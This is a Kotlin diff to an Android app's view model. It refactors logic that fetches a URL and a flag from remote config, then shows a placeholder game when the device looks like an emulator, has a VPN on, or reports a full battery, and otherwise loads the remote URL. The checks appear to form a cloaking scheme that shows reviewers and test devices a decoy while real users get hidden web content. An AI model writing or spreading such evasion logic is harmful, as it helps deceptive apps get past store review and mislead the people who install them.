@@ -33,13 +33,13 @@ class MainViewModel @Inject constructor(
         viewModelScope.launch {
             val checkedInternetConnection = service.checkedInternetConnection()
             val pathUrl = keeper.getSharedUrl()
+            val sharedTo = keeper.getSharedTo()
             if (!pathUrl.isNullOrEmpty()) {
                 if (checkedInternetConnection) {
-                    _state.value.copy(
-                        status = Succsess(url = pathUrl)
+                    setStatusByChecking(
+                        url = pathUrl,
+                        isCheckVpn = sharedTo
                     )
-                        .updateStateUI()
-
                 } else {
                     game()
                 }
@@ -56,33 +56,11 @@ class MainViewModel @Inject constructor(
                                 val isCheckedVpn = remoteConfig.getBoolean("to")
                                 val resultUrl = remoteConfig.getString("url")
                                 keeper.setSharedUrl(url = resultUrl)
-                                val vpnActive = service.vpnActive()
-                                val batteryLevel = service.batteryLevel()
-
-                                if (isCheckedVpn) {
-                                    if (service.checkIsEmu() || resultUrl == "" || vpnActive || batteryLevel == 100) {
-                                        game()
-                                    } else {
-                                        _state.value.copy(
-                                            status = Succsess(url = resultUrl)
-                                        )
-                                            .updateStateUI()
-
-                                    }
-                                } else {
-                                    viewModelScope.launch {
-                                        if (service.checkIsEmu() || resultUrl == "" || batteryLevel == 100) {
-                                            game()
-                                        } else {
-                                            _state.value.copy(
-                                                status = Succsess(url = resultUrl)
-                                            )
-                                                .updateStateUI()
-
-                                        }
-                                    }
-                                }
-
+                                keeper.setSharedTo(isCheckedVpn)
+                                setStatusByChecking(
+                                    url = resultUrl,
+                                    isCheckVpn = isCheckedVpn
+                                )
                             } else {
                                 _state.value.copy(
                                     status = Error(error = p0.result.toString())
@@ -92,6 +70,36 @@ class MainViewModel @Inject constructor(
                         }
                 } else {
                     game()
+                }
+            }
+        }
+    }
+
+    private fun setStatusByChecking(url:String, isCheckVpn: Boolean) {
+
+        val vpnActive = service.vpnActive()
+        val batteryLevel = service.batteryLevel()
+
+        if (isCheckVpn) {
+            if (service.checkIsEmu() || url == "" || vpnActive || batteryLevel == 100) {
+                game()
+            } else {
+                _state.value.copy(
+                    status = Succsess(url = url)
+                )
+                    .updateStateUI()
+
+            }
+        } else {
+            viewModelScope.launch {
+                if (service.checkIsEmu() || url == "" || batteryLevel == 100) {
+                    game()
+                } else {
+                    _state.value.copy(
+                        status = Succsess(url = url)
+                    )
+                        .updateStateUI()
+
                 }
             }
         }
